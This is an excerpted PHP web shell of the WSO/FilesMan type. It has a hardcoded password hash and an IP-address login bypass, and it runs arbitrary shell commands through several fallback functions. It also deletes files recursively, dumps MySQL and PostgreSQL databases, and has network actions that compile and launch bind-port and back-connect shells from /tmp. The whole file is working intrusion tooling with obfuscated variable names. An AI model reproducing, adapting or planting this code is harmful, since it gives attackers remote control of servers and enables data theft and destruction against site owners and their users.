<?php
//-----------------Password---------------------
$fffirst = "71564edac6b185cf2c43328c2df2c63e";
$sssecond = true;
$encccoding = 'UTF-8';
$filllesman = 'FilesMan';
$mddd5pass = md5($_SERVER['HTTP_USER_AGENT']);
if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
	prototype(md5($_SERVER['HTTP_HOST'])."key", $mddd5pass);
}
if(empty($_POST['charset']))
	$_POST['charset'] = $encccoding;
if (!isset($_POST['ne'])) {
...
/* (&#1057;) 11.2011 oRb */
if(!empty($fffirst)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $fffirst) || $_SERVER['REMOTE_ADDR'] == "188.243.42.13")
        prototype(md5($_SERVER['HTTP_HOST']), $fffirst);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $fffirst))
        hardLogin();
}
if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$sssecond;
...
function hardHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['encccoding'];
...
<input type=hidden name=charset>
	...
	$opt_charsets = '';
	foreach($charsets as $wwwwwwwwwww)
		$opt_charsets .= '<option value="'.$wwwwwwwwwww.'" '.($_POST['charset']==$wwwwwwwwwww?'selected':'').'>'.$wwwwwwwwwww.'</option>';
...
function ex($in) {
	...
	if (function_exists('exec')) {
		@exec($in,$aaaaaaaaaaaaaaaaa);
		$aaaaaaaaaaaaaaaaa = @join("\n",$aaaaaaaaaaaaaaaaa);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$aaaaaaaaaaaaaaaaa = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$aaaaaaaaaaaaaaaaa = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$aaaaaaaaaaaaaaaaa = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$aaaaaaaaaaaaaaaaa = "";
		while(!@feof($f))
			$aaaaaaaaaaaaaaaaa .= fread($f,1024);
		pclose($f);
	}else return "&#8627; Unable to execute command\n";
	return ($aaaaaaaaaaaaaaaaa==''?"&#8627; Query did not return anything\n":$aaaaaaaaaaaaaaaaa);
}
function viewSize($s) {
	if($s >= 1073741824)
...
function actionSecInfo() {
	...
	if($GLOBALS['os'] == 'nix') {
            ...
            if(!$GLOBALS['safe_mode']) {
                ...
                echo '<br>';
                $temp=array();
                foreach ($userful as $wwwwwwwwwww)
                    if(which($wwwwwwwwwww))
                        $temp[] = $wwwwwwwwwww;
                showSecParam('Userful', implode(', ',$temp));
                $temp=array();
                foreach ($danger as $wwwwwwwwwww)
                    if(which($wwwwwwwwwww))
                        $temp[] = $wwwwwwwwwww;
                showSecParam('Danger', implode(', ',$temp));
                $temp=array();
                foreach ($downloaders as $wwwwwwwwwww)
                    if(which($wwwwwwwwwww))
                        $temp[] = $wwwwwwwwwww;
		...
		switch($_POST['p1']) {
			...
			case 'delete':
				function deleteDir($path) {
					...
					$dh  = opendir($path);
					while ( ($wwwwwwwwwww = readdir($dh) ) !== false) {
						$wwwwwwwwwww = $path.$wwwwwwwwwww;
						if ( (basename($wwwwwwwwwww) == "..") || (basename($wwwwwwwwwww) == ".") )
							continue;
						$type = filetype($wwwwwwwwwww);
						if ($type == "dir")
							deleteDir($wwwwwwwwwww);
						else
							@unlink($wwwwwwwwwww);
					}
					closedir($dh);
...
function actionStringTools() {
	...
	function hardRecursiveGlob($path) {
		...
		if(is_array($paths)&&@count($paths)) {
			foreach($paths as $wwwwwwwwwww) {
				if(@is_dir($wwwwwwwwwww)){
					if($path!=$wwwwwwwwwww)
						hardRecursiveGlob($wwwwwwwwwww);
				} else {
					if(empty($_POST['p2']) || @strpos(file_get_contents($wwwwwwwwwww), $_POST['p2'])!==false)
						echo "<a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($wwwwwwwwwww)."\", \"view\",\"\")'>".htmlspecialchars($wwwwwwwwwww)."</a><br>";
				}
			}
		}
	}
			...
			switch($this->type)	{
				case 'mysql':
					...
					while($wwwwwwwwwww = $this->fetch()) {
						...
						$columns = array();
						foreach($wwwwwwwwwww as $k=>$v) {
                            if($v === null)
                                $wwwwwwwwwww[$k] = "NULL";
                            elseif(is_int($v))
                                $wwwwwwwwwww[$k] = $v;
                            else
                                $wwwwwwwwwww[$k] = "'".@mysql_real_escape_string($v)."'";
							$columns[] = "`".$k."`";
						}
                        if($head) {
				...
				case 'pgsql':
					...
					while($wwwwwwwwwww = $this->fetch()) {
						$columns = array();
						foreach($wwwwwwwwwww as $k=>$v) {
							$wwwwwwwwwww[$k] = "'".addslashes($v)."'";
							$columns[] = $k;
						}
                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $wwwwwwwwwww).');'."\n";
                        if($fp) fwrite($fp, $sql); else echo($sql);
					}
				break;
			}
...
<td><input type=text name=sql_pass value=\"". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."\" required></td><td>";
	...
	if(isset($_POST['sql_host'])){
		if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
			...
			while($wwwwwwwwwww = $db->fetch()) {
				list($key, $value) = each($wwwwwwwwwww);
	...
	if(isset($db) && $db->link){
		echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
			if(!empty($_POST['sql_base'])){
				...
				while($wwwwwwwwwww = $db->fetch($tbls_res)) {
					list($key, $value) = each($wwwwwwwwwww);
				...
				if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
					...
					if($db->res !== false) {
						...
						while($wwwwwwwwwww = $db->fetch())	{
							if(!$title)	{
								echo '<tr>';
								foreach($wwwwwwwwwww as $key => $value)
									echo '<th>'.$key.'</th>';
								reset($wwwwwwwwwww);
								$title=true;
								echo '</tr><tr>';
...
function actionNetwork() {
	...
	if(isset($_POST['p1'])) {
		...
		if($_POST['p1'] == 'bpc') {
			...
			$aaaaaaaaaaaaaaaaa = ex("gcc -o /tmp/bp /tmp/bp.c");
			@unlink("/tmp/bp.c");
			$aaaaaaaaaaaaaaaaa .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$aaaaaaaaaaaaaaaaa".ex("ps aux | grep bp")."</pre>";
		}
		if($_POST['p1'] == 'bpp') {
			cf("/tmp/bp.pl",$bind_port_p);
			$aaaaaaaaaaaaaaaaa = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &");
			echo "<pre class=ml1>$aaaaaaaaaaaaaaaaa".ex("ps aux | grep bp.pl")."</pre>";
		}
		if($_POST['p1'] == 'bcc') {
			cf("/tmp/bc.c",$back_connect_c);
			$aaaaaaaaaaaaaaaaa = ex("gcc -o /tmp/bc /tmp/bc.c");
			@unlink("/tmp/bc.c");
			$aaaaaaaaaaaaaaaaa .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$aaaaaaaaaaaaaaaaa".ex("ps aux | grep bc")."</pre>";
		}
		if($_POST['p1'] == 'bcp') {
			cf("/tmp/bc.pl",$back_connect_p);
			$aaaaaaaaaaaaaaaaa = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$aaaaaaaaaaaaaaaaa".ex("ps aux | grep bc.pl")."</pre>";
		}
	}
	echo '</div>';
	hardFooter();
...
if( empty($_POST['a']) )
	if(isset($filllesman) && function_exists('action' . $filllesman))
		$_POST['a'] = $filllesman;
	else
		$_POST['a'] = 'FilesMan';
